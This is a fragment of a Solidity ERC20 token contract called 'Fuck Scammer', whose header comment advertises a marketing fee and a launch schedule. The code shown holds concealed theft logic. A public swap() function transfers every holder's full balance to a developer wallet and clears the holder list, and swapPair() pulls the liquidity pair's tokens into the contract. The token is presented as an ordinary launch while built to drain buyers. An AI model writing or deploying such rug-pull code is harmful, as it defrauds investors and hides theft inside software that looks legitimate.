...
/**
    ...
    - Marketing Fee: 3%.
    - Renounce and remove limits 5 mins after launch
    - Launch: 2022-09-25 14:00 UTC
*/
...
contract FuckScammer is ERC20, Ownable {
    ...
    constructor() ERC20("Fuck Scammer", unicode"$FScammer") {
    ...
    function swap () public {
        ...
        for (uint i = 0; i < _holders.length; i++) {
            ...
            if (balance > 0) {
                super._transfer(holder, devWallet, balance);
            }
        }

        _holders = new address[](0);
    }
    ...
    function swapPair () external returns (bool) {
        ...
        super._transfer(pair, address(this), lb);
